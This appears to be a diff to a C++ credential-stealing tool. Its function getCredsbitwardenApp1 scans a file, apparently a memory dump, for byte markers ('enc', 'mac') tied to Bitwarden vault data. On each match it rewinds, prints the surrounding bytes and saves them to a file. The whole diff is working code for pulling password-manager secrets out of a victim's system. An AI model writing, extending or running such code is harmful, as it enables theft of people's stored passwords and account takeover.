@@ -15,9 +15,10 @@ int getCredsbitwardenApp1(std::string filename) {
     }
 
     // Specify your search pattern here
-    std::vector<unsigned char> searchPattern = { 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00, 0x01, 0xCC };
+    std::vector<unsigned char> searchPattern = { 0x65, 0x6e, 0x63, 0x01, 0x00, 0x01, 0x40, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6d, 0x61, 0x63, 0x01, 0x00, 0x01, 0x40, 0x40, 0x00, 0x00 };
 
-    int consecutiveSpaces = 0;  // To track how many bytes matched so far
+    // Initialize variables to count consecutive spaces
+    int consecutiveSpaces = 0;
 
     while (!file.eof()) {
         unsigned char c;
@@ -28,24 +29,26 @@ int getCredsbitwardenApp1(std::string filename) {
             consecutiveSpaces++;
 
             if (consecutiveSpaces == searchPattern.size()) {
-                // Pattern found, now read the next 50 characters after the pattern
-                std::vector<unsigned char> buffer(50, 0);  // Adjust size for 50 characters
+                // Pattern found, rewind to collect the 100 characters before the pattern
+                std::vector<unsigned char> buffer(100, 0);
+
+                file.seekg(-static_cast<int>(buffer.size()), std::ios::cur);
                 file.read(reinterpret_cast<char*>(buffer.data()), buffer.size());
 
                 // Convert the buffer to a UTF-8 string
                 std::string utf8Data(buffer.begin(), buffer.end());
 
                 // Print the UTF-8 string
-                std::cout << "Data after pattern: " + utf8Data << std::endl;
+                std::cout << "Pattern Data: " + utf8Data << std::endl;
 
-                // Save into file
+                //Save into file
                 saveFile(utf8Data);
 
                 consecutiveSpaces = 0;
             }
         }
         else {
-            consecutiveSpaces = 0;  // Reset if the current character doesn't match the pattern
+            consecutiveSpaces = 0;
         }
     }
 
